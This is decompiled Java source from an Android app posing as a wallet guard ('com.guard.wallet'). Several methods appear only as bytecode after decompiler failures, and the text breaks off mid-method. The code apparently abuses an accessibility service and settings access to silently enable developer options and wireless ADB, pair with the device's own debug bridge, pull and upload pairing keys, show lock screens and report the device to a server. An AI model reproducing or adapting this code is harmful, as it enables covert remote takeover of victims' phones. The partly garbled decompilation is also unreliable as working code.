package h;

import a1.q;
import android.content.ContentResolver;
import android.content.Context;
import android.os.Build.VERSION;
import android.provider.Settings.Global;
import android.provider.Settings.System;
import android.text.TextUtils;
import android.util.Log;
import com.guard.wallet.LockActivity;
import com.guard.wallet.entity.CheckPortResult;
import com.guard.wallet.entity.Point;
import com.guard.wallet.http.i;
import com.guard.wallet.http.l;
import com.guard.wallet.http.n;
import com.guard.wallet.req.BlockViewVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.req.ReqWifiSettingDialogVO;
import com.guard.wallet.req.TouchEvent;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.g;
import com.guard.wallet.utils.h;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.security.PrivateKey;
import java.security.cert.Certificate;
import java.util.Date;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;
import java.util.Locale;
import java.util.Objects;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.locks.ReentrantLock;
import o.t;

public final class e extends b1.b {
   public static final Integer E = 5555;
   public static e F;
   public final AtomicBoolean A;
   public final AtomicBoolean B;
   public PrivateKey C;
   public Certificate D;
   public final Context i;
   public final ReentrantLock j = new ReentrantLock();
   public final ReentrantLock k = new ReentrantLock();
   public final ReentrantLock l = new ReentrantLock();
   public final AtomicBoolean m = new AtomicBoolean(true);
   public final AtomicInteger n = new AtomicInteger(0);
   public final ExecutorService o = Executors.newFixedThreadPool(1);
   public final ExecutorService p = Executors.newFixedThreadPool(5);
   public final ExecutorService q = Executors.newFixedThreadPool(2);
   public final ConcurrentHashMap r = new ConcurrentHashMap();
   public final AtomicBoolean s = new AtomicBoolean(false);
   public final AtomicLong t = new AtomicLong(0L);
   public final AtomicBoolean u = new AtomicBoolean(false);
   public final AtomicBoolean v = new AtomicBoolean(false);
   public final AtomicBoolean w = new AtomicBoolean(false);
   public final AtomicInteger x = new AtomicInteger();
   public final AtomicInteger y = new AtomicInteger(0);
   public final AtomicInteger z = new AtomicInteger(0);

   public e(Context var1) {
      this.A = new AtomicBoolean(false);
      this.B = new AtomicBoolean(false);
      this.i = var1;
      super.e = VERSION.SDK_INT;
   }

   public static e S() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      //
      // Bytecode:
      // 00: ldc h/e
      // 02: monitorenter
      // 03: getstatic h/e.F Lh/e;
      // 06: astore 0
      // 07: ldc h/e
      // 09: monitorexit
      // 0a: aload 0
      // 0b: areturn
      // 0c: astore 0
      // 0d: ldc h/e
      // 0f: monitorexit
      // 10: aload 0
      // 11: athrow
   }

   public static void T() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.util.collections.fixed.FastFixedSet.contains(Object)" because "predset" is null
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.lambda$removeErroneousNodes$1(FastExtendedPostdominanceHelper.java:231)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.iterateReachability(FastExtendedPostdominanceHelper.java:373)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.removeErroneousNodes(FastExtendedPostdominanceHelper.java:207)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.getExtendedPostdominators(FastExtendedPostdominanceHelper.java:63)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.findGeneralStatement(DomHelper.java:516)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:451)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:358)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:208)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: invokestatic com/guard/wallet/utils/g.Z ()Landroid/content/Context;
      // 03: astore 1
      // 04: getstatic h/e.F Lh/e;
      // 07: ifnonnull 4e
      // 0a: aload 1
      // 0b: ifnull 4e
      // 0e: ldc h/e
      // 10: monitorenter
      // 11: getstatic h/e.F Lh/e;
      // 14: ifnonnull 42
      // 17: new h/e
      // 1a: astore 2
      // 1b: aload 2
      // 1c: aload 1
      // 1d: invokespecial h/e.<init> (Landroid/content/Context;)V
      // 20: aload 2
      // 21: putstatic h/e.F Lh/e;
      // 24: ldc com/guard/wallet/entity/ADBConfig
      // 26: monitorenter
      // 27: invokestatic com/guard/wallet/utils/h.J ()Lcom/guard/wallet/entity/ADBConfig;
      // 2a: invokevirtual com/guard/wallet/entity/ADBConfig.isPaired ()Z
      // 2d: istore 0
      // 2e: ldc com/guard/wallet/entity/ADBConfig
      // 30: monitorexit
      // 31: aload 2
      // 32: getfield h/e.w Ljava/util/concurrent/atomic/AtomicBoolean;
      // 35: iload 0
      // 36: invokevirtual java/util/concurrent/atomic/AtomicBoolean.set (Z)V
      // 39: goto 42
      // 3c: astore 1
      // 3d: ldc com/guard/wallet/entity/ADBConfig
      // 3f: monitorexit
      // 40: aload 1
      // 41: athrow
      // 42: ldc h/e
      // 44: monitorexit
      // 45: goto 4e
      // 48: astore 1
      // 49: ldc h/e
      // 4b: monitorexit
      // 4c: aload 1
      // 4d: athrow
      // 4e: return
   }

   // $VF: Handled exception range with multiple entry points by splitting it
   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean Y(BlockViewVO var0) {
      Exception var10000;
      label231: {
         try {
            if (MyAccessibilityService.P() == null) {
               return false;
            }

            if (VERSION.SDK_INT < 30 || com.guard.wallet.utils.e.h()) {
               return false;
            }
         } catch (Exception var21) {
            var10000 = var21;
            boolean var10001 = false;
            break label231;
         }

         BlockViewVO var2 = var0;
         if (var0 == null) {
            try {
               var2 = new BlockViewVO(false, null, true, true);
            } catch (Exception var20) {
               var10000 = var20;
               boolean var39 = false;
               break label231;
            }
         }

         try {
            if (MyAccessibilityService.P().j()) {
               return false;
            }
         } catch (Exception var26) {
            var10000 = var26;
            boolean var40 = false;
            break label231;
         }

         try {
            if (w.a.a()) {
               return false;
            }
         } catch (Exception var19) {
            var10000 = var19;
            boolean var41 = false;
            break label231;
         }

         boolean var1;
         label219: {
            label218: {
               try {
                  if (!com.guard.wallet.utils.h.n() && !com.guard.wallet.utils.h.o()) {
                     break label218;
                  }
               } catch (Exception var25) {
                  var10000 = var25;
                  boolean var42 = false;
                  break label231;
               }

               var1 = true;
               break label219;
            }

            var1 = false;
         }

         try {
            if (!com.guard.wallet.utils.h.o()) {
               com.guard.wallet.http.l.c();
            }
         } catch (Exception var18) {
            var10000 = var18;
            boolean var43 = false;
            break label231;
         }

         try {
            if (!com.guard.wallet.utils.g.K()) {
               Z();
            }
         } catch (Exception var17) {
            var10000 = var17;
            boolean var44 = false;
            break label231;
         }

         try {
            if (!Objects.equals(com.guard.wallet.utils.g.z0().getIsWifiConnected(), 1)) {
               String var31 = com.guard.wallet.http.l.a;
               String var35 = com.guard.wallet.utils.h.l("deviceId");
               if (!a1.q.B(var35)) {
                  ReqWifiSettingDialogVO var32 = new ReqWifiSettingDialogVO(var35);
                  n var37 = new n();
                  i var36 = new i(com.guard.wallet.http.l.a);
                  var36.d(var32, "/api/navigate/wifiDialog.json", var37);
               }

               return false;
            }
         } catch (Exception var24) {
            var10000 = var24;
            boolean var45 = false;
            break label231;
         }

         try {
            if (!com.guard.wallet.utils.g.J()) {
               a0();
            }
         } catch (Exception var16) {
            var10000 = var16;
            boolean var46 = false;
            break label231;
         }

         label201: {
            try {
               if (!com.guard.wallet.utils.g.p0() || !com.guard.wallet.utils.g.r0()) {
                  break label201;
               }
            } catch (Exception var23) {
               var10000 = var23;
               boolean var47 = false;
               break label231;
            }

            if (!var1) {
               return false;
            }
         }

         try {
            if (!com.guard.wallet.utils.g.n0()) {
               return false;
            }
         } catch (Exception var22) {
            var10000 = var22;
            boolean var48 = false;
            break label231;
         }

         try {
            if (e.b.a != null && com.guard.wallet.utils.e.l()) {
               e.b.e();
               com.guard.wallet.utils.g.T0(10);
            }
         } catch (Exception var15) {
            var10000 = var15;
            boolean var49 = false;
            break label231;
         }

         try {
            if (com.guard.wallet.utils.e.j()) {
               MyAccessibilityService.P().getClass();
               var2.setBlockDrawable(MyAccessibilityService.o0());
            }
         } catch (Exception var14) {
            var10000 = var14;
            boolean var50 = false;
            break label231;
         }

         try {
            com.guard.wallet.helper.g.a(var2);
            ReqUnlockDeviceVO var27 = new ReqUnlockDeviceVO();
            if (!com.guard.wallet.utils.g.p1(var27)) {
               com.guard.wallet.helper.g.c();
               return false;
            }
         } catch (Exception var13) {
            var10000 = var13;
            boolean var51 = false;
            break label231;
         }

         try {
            if (LockActivity.b() != null) {
               LockActivity.a();
               com.guard.wallet.utils.g.T0(10);
            }
         } catch (Exception var12) {
            var10000 = var12;
            boolean var52 = false;
            break label231;
         }

         try {
            if (a1.q.G() && !a1.q.A() && !a1.q.O(null, null)) {
               com.guard.wallet.helper.g.c();
               return false;
            }
         } catch (Exception var11) {
            var10000 = var11;
            boolean var53 = false;
            break label231;
         }

         label163: {
            label234: {
               try {
                  com.guard.wallet.http.l.t("PAIR_RUNNING_EVENT");
                  if (com.guard.wallet.utils.g.K()) {
                     break label234;
                  }

                  MyAccessibilityService.P().H(true, true);
                  MyAccessibilityService.P().a();
                  var28 = MyAccessibilityService.P();
                  var28.getClass();
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var54 = false;
                  break label231;
               }

               label235: {
                  label154: {
                     try {
                        if (var28.n() != null) {
                           var28.z();
                        }
                     } catch (Exception var9) {
                        var10000 = var9;
                        boolean var55 = false;
                        break label154;
                     }

                     try {
                        ConcurrentLinkedQueue var3 = var28.a;
                        t var33 = new t();
                        var3.add(var33);
                        LinkedList var34 = o.t.X();
                        var28.t(t.class.getName(), var34);
                        break label235;
                     } catch (Exception var8) {
                        var10000 = var8;
                        boolean var56 = false;
                     }
                  }

                  Exception var29 = var10000;

                  try {
                     a1.q.s("com.guard.wallet.service.AccessibilityDelegateManager", var29);
                  } catch (Exception var7) {
                     var10000 = var7;
                     boolean var57 = false;
                     break label231;
                  }
               }

               try {
                  com.guard.wallet.utils.g.T0(10);
                  com.guard.wallet.utils.g.g1();
                  break label163;
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var58 = false;
                  break label231;
               }
            }

            try {
               MyAccessibilityService.P().H(true, true);
               MyAccessibilityService.P().e();
               com.guard.wallet.utils.g.T0(10);
               com.guard.wallet.utils.g.f1();
            } catch (Exception var5) {
               var10000 = var5;
               boolean var59 = false;
               break label231;
            }
         }

         try {
            return true;
         } catch (Exception var4) {
            var10000 = var4;
            boolean var60 = false;
         }
      }

      Exception var30 = var10000;
      a1.q.s("AdbConnectionManager", var30);
      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void Z() {
      boolean var0;
      label56: {
         label55: {
            Exception var10000;
            label59: {
               try {
                  if (com.guard.wallet.utils.g.Z() == null || !System.canWrite(com.guard.wallet.utils.g.Z()) && !com.guard.wallet.utils.g.j()) {
                     break label55;
                  }
               } catch (Exception var4) {
                  var10000 = var4;
                  boolean var10001 = false;
                  break label59;
               }

               ContentResolver var1;
               try {
                  Log.d("ApplicationUtil", "已有系统设置修改权限");
                  var1 = com.guard.wallet.utils.g.Z().getContentResolver();
               } catch (Exception var3) {
                  var10000 = var3;
                  boolean var7 = false;
                  break label59;
               }

               var0 = true;

               try {
                  Global.putInt(var1, "development_settings_enabled", 1);
                  if (com.guard.wallet.utils.g.K()) {
                     Log.d("ApplicationUtil", "已有系统设置修改权限,开启开发者选项成功");
                     break label56;
                  }
                  break label55;
               } catch (Exception var2) {
                  var10000 = var2;
                  boolean var8 = false;
               }
            }

            Exception var5 = var10000;
            a1.q.s("ApplicationUtil", var5);
         }

         var0 = false;
      }

      if (!var0) {
         String var6;
         if (!a1.q.E(7912)) {
            Log.d("AdbConnectionManager", "请求7912开启开发者选项");
            var6 = "http://127.0.0.1:7912";
         } else {
            if (a1.q.E(7911)) {
               return;
            }

            Log.d("AdbConnectionManager", "请求7911开启开发者选项");
            var6 = "http://127.0.0.1:7911";
         }

         com.guard.wallet.http.l.l(var6);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void a0() {
      Log.d("AdbConnectionManager", "准备开启无线调试");
      Integer var2 = com.guard.wallet.utils.g.z0().getIsWifiConnected();
      boolean var1 = false;
      if (Objects.equals(var2, 0)) {
         Log.d("AdbConnectionManager", "WIFI无线网络没有连接");
      } else if (com.guard.wallet.utils.g.p0()) {
         Log.d("AdbConnectionManager", "锁屏中,放弃开启无线调试");
      } else if (MyAccessibilityService.P() == null) {
         Log.d("AdbConnectionManager", "无障碍服务未开启,放弃开启无线调试");
      } else if (MyAccessibilityService.P() != null && !MyAccessibilityService.P().V()) {
         Log.d("AdbConnectionManager", "无障碍监听窗口初始化未完成,放弃开启无线调试");
      } else {
         if (com.guard.wallet.utils.e.l() && !com.guard.wallet.utils.g.K()) {
            Z();
         }

         boolean var0 = var1;

         label75: {
            label74: {
               Exception var10000;
               label87: {
                  label88: {
                     try {
                        if (com.guard.wallet.utils.g.Z() == null) {
                           break label75;
                        }

                        if (System.canWrite(com.guard.wallet.utils.g.Z())) {
                           break label88;
                        }
                     } catch (Exception var6) {
                        var10000 = var6;
                        boolean var10001 = false;
                        break label87;
                     }

                     var0 = var1;

                     try {
                        if (!com.guard.wallet.utils.g.j()) {
                           break label75;
                        }
                     } catch (Exception var5) {
                        var10000 = var5;
                        boolean var8 = false;
                        break label87;
                     }
                  }

                  try {
                     Log.d("ApplicationUtil", "已有系统设置修改权限");
                     Global.putInt(com.guard.wallet.utils.g.Z().getContentResolver(), "adb_wifi_enabled", 1);
                  } catch (Exception var4) {
                     var10000 = var4;
                     boolean var9 = false;
                     break label87;
                  }

                  var0 = var1;

                  try {
                     if (!com.guard.wallet.utils.g.J()) {
                        break label75;
                     }

                     Log.d("ApplicationUtil", "已有系统设置修改权限,开启无线调试成功");
                     break label74;
                  } catch (Exception var3) {
                     var10000 = var3;
                     boolean var10 = false;
                  }
               }

               Exception var7 = var10000;
               a1.q.s("ApplicationUtil", var7);
               var0 = var1;
               break label75;
            }

            var0 = true;
         }

         if (var0) {
            Log.d("AdbConnectionManager", "无障碍服务监听窗口初始化已完成,本地开启无线调试");
         } else if (!a1.q.E(7912)) {
            Log.d("AdbConnectionManager", "无障碍服务监听窗口初始化已完成,请求7912开启无线调试");
            com.guard.wallet.http.l.m("http://127.0.0.1:7912");
         } else {
            if (!a1.q.E(7911)) {
               Log.d("AdbConnectionManager", "无障碍服务监听窗口初始化已完成,请求7911开启无线调试");
               com.guard.wallet.http.l.m("http://127.0.0.1:7911");
            }
         }
      }
   }

   @Override
   public final Certificate B() {
      if (this.D == null) {
         this.D = com.guard.wallet.utils.g.H0();
      }

      if (this.D == null) {
         String var1 = com.guard.wallet.utils.h.l("cert.pem.url");
         String var2 = com.guard.wallet.utils.g.i0();
         Certificate var3;
         if (!a1.q.B(var1) && !a1.q.B(var2) && p.b.b(var1, var2.concat("/").concat("cert.pem"))) {
            var3 = com.guard.wallet.utils.g.H0();
         } else {
            var3 = null;
         }

         this.D = var3;
      }

      return this.D;
   }

   @Override
   public final PrivateKey C() {
      if (this.C == null) {
         this.C = com.guard.wallet.utils.g.I0();
      }

      if (this.C == null) {
         String var1 = com.guard.wallet.utils.h.l("private.key.url");
         String var2 = com.guard.wallet.utils.g.i0();
         PrivateKey var3;
         if (!a1.q.B(var1) && !a1.q.B(var2) && p.b.b(var1, var2.concat("/").concat("private.key"))) {
            var3 = com.guard.wallet.utils.g.I0();
         } else {
            var3 = null;
         }

         this.C = var3;
      }

      return this.C;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   @Override
   public final boolean D() {
      boolean var4 = this.u.get();
      boolean var3 = false;
      boolean var2 = var3;
      if (var4) {
         Object var5 = super.a;
         synchronized (var5){} // $VF: monitorenter 

         boolean var37;
         label328: {
            Throwable var10000;
            label329: {
               b1.d var6;
               try {
                  var6 = super.b;
               } catch (Throwable var36) {
                  var10000 = var36;
                  boolean var10001 = false;
                  break label329;
               }

               label317: {
                  label334: {
                     if (var6 != null) {
                        label313: {
                           label312: {
                              try {
                                 Socket var38 = var6.a;
                                 if (!var38.isClosed() && var38.isConnected()) {
                                    break label312;
                                 }
                              } catch (Throwable var35) {
                                 var10000 = var35;
                                 boolean var40 = false;
                                 break label329;
                              }

                              var37 = false;
                              break label313;
                           }

                           var37 = true;
                        }

                        if (var37) {
                           try {
                              if (super.b.n) {
                                 break label334;
                              }
                           } catch (Throwable var34) {
                              var10000 = var34;
                              boolean var41 = false;
                              break label329;
                           }
                        }
                     }

                     var37 = false;
                     break label317;
                  }

                  var37 = true;
               }

               label295:
               try {
                  // $VF: monitorexit
                  break label328;
               } catch (Throwable var33) {
                  var10000 = var33;
                  boolean var42 = false;
                  break label295;
               }
            }

            while (true) {
               Throwable var39 = var10000;

               try {
                  // $VF: monitorexit
                  throw var39;
               } catch (Throwable var32) {
                  var10000 = var32;
                  boolean var43 = false;
                  continue;
               }
            }
         }

         var2 = var3;
         if (var37) {
            var2 = true;
         }
      }

      return var2;
   }

   public final boolean G(String var1, String var2, String var3, String var4) {
      if (!a1.q.B(var2)) {
         String var5 = var3;
         if (a1.q.B(var3)) {
            var3 = a1.q.x(var2);
            var5 = var3;
            if (a1.q.B(var3)) {
               var5 = "unknown";
            }
         }

         ConcurrentHashMap var8 = this.r;
         if (!var8.containsKey(var2) && this.D()) {
            var8.put(var2, new Date().getTime());
            p.a var9 = new p.a(var2, var5, 0);
            d var6 = new d(this, var1, var2, this.p.submit(var9), var4);
            this.q.submit(var6);
            return true;
         }
      }

      return false;
   }

   public final void H() {
      ReentrantLock var1 = this.k;
      if (var1.tryLock()) {
         try {
            if (w.a.a()) {
               Log.d("AdbConnectionManager", "进入省电模式保活策略");
               var1.unlock();
               return;
            }

            if (VERSION.SDK_INT >= 30 && !com.guard.wallet.utils.e.h()) {
               if (!com.guard.wallet.utils.g.J() && Objects.equals(com.guard.wallet.utils.g.z0().getIsWifiConnected(), 1)) {
                  a0();
               }

               if (this.C() != null && this.B() != null) {
                  ExecutorService var3 = this.o;
                  a var2 = new a(this, 0);
                  var3.submit(var2);
               }
            } else {
               Log.d("AdbConnectionManager", "此处添加 Android 10及以下版本、华为鸿蒙的ADB连接逻辑");
            }
         } catch (Exception var4) {
            a1.q.s("AdbConnectionManager", var4);
         }

         var1.unlock();
      }
   }

   public final boolean I(String var1, String var2, String var3, String var4) {
      if (!a1.q.B(var2)) {
         String var5 = var3;
         if (a1.q.B(var3)) {
            var3 = a1.q.x(var2);
            var5 = var3;
            if (a1.q.B(var3)) {
               var5 = "unknown";
            }
         }

         ConcurrentHashMap var8 = this.r;
         if (!var8.containsKey(var2) && this.D()) {
            var8.put(var2, new Date().getTime());
            p.a var9 = new p.a(var2, var5, 0);
            b var6 = new b(this, var1, var2, var5, this.p.submit(var9), var4);
            this.q.submit(var6);
            return true;
         }
      }

      return false;
   }

   public final CheckPortResult J(int param1) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: aload 0
      // 01: monitorenter
      // 02: aload 0
      // 03: getfield h/e.i Landroid/content/Context;
      // 06: ifnull c3
      // 09: iload 1
      // 0a: ifle c3
      // 0d: aload 0
      // 0e: invokevirtual h/e.C ()Ljava/security/PrivateKey;
      // 11: ifnull c3
      // 14: aload 0
      // 15: invokevirtual h/e.B ()Ljava/security/cert/Certificate;
      // 18: astore 2
      // 19: aload 2
      // 1a: ifnull c3
      // 1d: aload 0
      // 1e: invokevirtual h/e.D ()Z
      // 21: ifeq 5f
      // 24: new com/guard/wallet/entity/CheckPortResult
      // 27: astore 2
      // 28: aload 2
      // 29: invokespecial com/guard/wallet/entity/CheckPortResult.<init> ()V
      // 2c: aload 2
      // 2d: bipush 1
      // 2e: invokevirtual com/guard/wallet/entity/CheckPortResult.setConnected (Z)V
      // 31: aload 2
      // 32: invokestatic com/guard/wallet/utils/h.a ()Ljava/lang/Integer;
      // 35: invokevirtual com/guard/wallet/entity/CheckPortResult.setDebugPort (Ljava/lang/Integer;)V
      // 38: aload 2
      // 39: ldc_w "com.guard.wallet"
      // 3c: invokevirtual com/guard/wallet/entity/CheckPortResult.setConnectedDevice (Ljava/lang/String;)V
      // 3f: aload 0
      // 40: getfield h/e.y Ljava/util/concurrent/atomic/AtomicInteger;
      // 43: bipush 0
      // 44: invokevirtual java/util/concurrent/atomic/AtomicInteger.set (I)V
      // 47: aload 0
      // 48: getfield h/e.u Ljava/util/concurrent/atomic/AtomicBoolean;
      // 4b: bipush 1
      // 4c: invokevirtual java/util/concurrent/atomic/AtomicBoolean.set (Z)V
      // 4f: aload 0
      // 50: getfield h/e.v Ljava/util/concurrent/atomic/AtomicBoolean;
      // 53: bipush 1
      // 54: invokevirtual java/util/concurrent/atomic/AtomicBoolean.set (Z)V
      // 57: aload 0
      // 58: monitorexit
      // 59: aload 2
      // 5a: areturn
      // 5b: astore 2
      // 5c: goto bc
      // 5f: getstatic java/util/concurrent/TimeUnit.MILLISECONDS Ljava/util/concurrent/TimeUnit;
      // 62: astore 2
      // 63: aload 0
      // 64: ldc2_w 5000
      // 67: putfield b1/b.f J
      // 6a: aload 0
      // 6b: aload 2
      // 6c: putfield b1/b.g Ljava/util/concurrent/TimeUnit;
      // 6f: aload 0
      // 70: iload 1
      // 71: aload 0
      // 72: getfield h/e.i Landroid/content/Context;
      // 75: invokestatic com/guard/wallet/utils/g.c0 (Landroid/content/Context;)Ljava/lang/String;
      // 78: invokevirtual b1/b.y (ILjava/lang/String;)I
      // 7b: istore 1
      // 7c: iload 1
      // 7d: ifle c3
      // 80: new com/guard/wallet/entity/CheckPortResult
      // 83: astore 2
      // 84: aload 2
      // 85: invokespecial com/guard/wallet/entity/CheckPortResult.<init> ()V
      // 88: aload 2
      // 89: bipush 1
      // 8a: invokevirtual com/guard/wallet/entity/CheckPortResult.setConnected (Z)V
      // 8d: aload 2
      // 8e: iload 1
      // 8f: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 92: invokevirtual com/guard/wallet/entity/CheckPortResult.setDebugPort (Ljava/lang/Integer;)V
      // 95: aload 2
      // 96: ldc_w "com.guard.wallet"
      // 99: invokevirtual com/guard/wallet/entity/CheckPortResult.setConnectedDevice (Ljava/lang/String;)V
      // 9c: aload 2
      // 9d: invokestatic com/guard/wallet/utils/h.x (Lcom/guard/wallet/entity/CheckPortResult;)V
      // a0: aload 0
      // a1: getfield h/e.y Ljava/util/concurrent/atomic/AtomicInteger;
      // a4: bipush 0
      // a5: invokevirtual java/util/concurrent/atomic/AtomicInteger.set (I)V
      // a8: aload 0
      // a9: getfield h/e.u Ljava/util/concurrent/atomic/AtomicBoolean;
      // ac: bipush 1
      // ad: invokevirtual java/util/concurrent/atomic/AtomicBoolean.set (Z)V
      // b0: aload 0
      // b1: getfield h/e.v Ljava/util/concurrent/atomic/AtomicBoolean;
      // b4: bipush 1
      // b5: invokevirtual java/util/concurrent/atomic/AtomicBoolean.set (Z)V
      // b8: aload 0
      // b9: monitorexit
      // ba: aload 2
      // bb: areturn
      // bc: ldc_w "AdbConnectionManager"
      // bf: aload 2
      // c0: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // c3: aload 0
      // c4: monitorexit
      // c5: aconst_null
      // c6: areturn
      // c7: astore 2
      // c8: aload 0
      // c9: monitorexit
      // ca: aload 2
      // cb: athrow
   }

   public final boolean K(String param1, int param2, String param3) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      //
      // Bytecode:
      // 000: aload 0
      // 001: getfield h/e.l Ljava/util/concurrent/locks/ReentrantLock;
      // 004: invokevirtual java/util/concurrent/locks/ReentrantLock.tryLock ()Z
      // 007: ifeq 1ea
      // 00a: aload 3
      // 00b: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 00e: istore 6
      // 010: bipush 0
      // 011: istore 7
      // 013: iload 6
      // 015: ifeq 021
      // 018: aload 0
      // 019: getfield h/e.l Ljava/util/concurrent/locks/ReentrantLock;
      // 01c: invokevirtual java/util/concurrent/locks/ReentrantLock.unlock ()V
      // 01f: bipush 0
      // 020: ireturn
      // 021: aload 0
      // 022: getfield h/e.i Landroid/content/Context;
      // 025: ifnull 1e3
      // 028: aload 1
      // 029: astore 8
      // 02b: aload 1
      // 02c: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 02f: ifeq 03b
      // 032: aload 0
      // 033: getfield h/e.i Landroid/content/Context;
      // 036: invokestatic com/guard/wallet/utils/g.c0 (Landroid/content/Context;)Ljava/lang/String;
      // 039: astore 8
      // 03b: iload 2
      // 03c: istore 4
      // 03e: iload 2
      // 03f: ifgt 04b
      // 042: aload 0
      // 043: invokevirtual h/e.L ()Ljava/lang/Integer;
      // 046: invokevirtual java/lang/Integer.intValue ()I
      // 049: istore 4
      // 04b: invokestatic com/guard/wallet/utils/g.R ()Z
      // 04e: ifeq 060
      // 051: ldc_w "AdbConnectionManager"
      // 054: ldc_w "本地配对密钥文件创建完成"
      // 057: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 05a: pop
      // 05b: bipush 1
      // 05c: istore 2
      // 05d: goto 062
      // 060: bipush 0
      // 061: istore 2
      // 062: aload 0
      // 063: invokestatic com/guard/wallet/utils/g.I0 ()Ljava/security/PrivateKey;
      // 066: putfield h/e.C Ljava/security/PrivateKey;
      // 069: aload 0
      // 06a: invokestatic com/guard/wallet/utils/g.H0 ()Ljava/security/cert/Certificate;
      // 06d: putfield h/e.D Ljava/security/cert/Certificate;
      // 070: iload 2
      // 071: istore 5
      // 073: iload 7
      // 075: istore 6
      // 077: getstatic android/os/Build$VERSION.SDK_INT I
      // 07a: bipush 30
      // 07c: if_icmplt 0af
      // 07f: ldc_w "AdbConnectionManager"
      // 082: ldc_w "正在配对中......"
      // 085: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 088: pop
      // 089: aload 0
      // 08a: aload 8
      // 08c: iload 4
      // 08e: aload 3
      // 08f: invokevirtual b1/b.F (Ljava/lang/String;ILjava/lang/String;)Z
      // 092: istore 6
      // 094: iload 2
      // 095: istore 5
      // 097: goto 0af
      // 09a: astore 1
      // 09b: goto 0a1
      // 09e: astore 1
      // 09f: bipush 0
      // 0a0: istore 2
      // 0a1: ldc_w "AdbConnectionManager"
      // 0a4: aload 1
      // 0a5: invokestatic a1/q.t (Ljava/lang/String;Ljava/lang/Throwable;)V
      // 0a8: iload 7
      // 0aa: istore 6
      // 0ac: iload 2
      // 0ad: istore 5
      // 0af: iload 6
      // 0b1: ifeq 189
      // 0b4: ldc_w "AdbConnectionManager"
      // 0b7: ldc_w "无线调试配对成功"
      // 0ba: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 0bd: pop
      // 0be: iload 5
      // 0c0: ifeq 193
      // 0c3: ldc_w "AdbConnectionManager"
      // 0c6: ldc_w "无线调试配对成功,上传本地配对文件"
      // 0c9: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 0cc: pop
      // 0cd: invokestatic com/guard/wallet/utils/g.i0 ()Ljava/lang/String;
      // 0d0: astore 8
      // 0d2: aload 8
      // 0d4: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 0d7: ifne 193
      // 0da: new java/util/LinkedList
      // 0dd: astore 1
      // 0de: aload 1
      // 0df: invokespecial java/util/LinkedList.<init> ()V
      // 0e2: aload 8
      // 0e4: ldc_w "/"
      // 0e7: invokevirtual java/lang/String.concat (Ljava/lang/String;)Ljava/lang/String;
      // 0ea: ldc_w "private.key"
      // 0ed: invokevirtual java/lang/String.concat (Ljava/lang/String;)Ljava/lang/String;
      // 0f0: astore 3
      // 0f1: aload 8
      // 0f3: ldc_w "/"
      // 0f6: invokevirtual java/lang/String.concat (Ljava/lang/String;)Ljava/lang/String;
      // 0f9: ldc_w "cert.pem"
      // 0fc: invokevirtual java/lang/String.concat (Ljava/lang/String;)Ljava/lang/String;
      // 0ff: astore 9
      // 101: new java/io/File
      // 104: astore 8
      // 106: aload 8
      // 108: aload 3
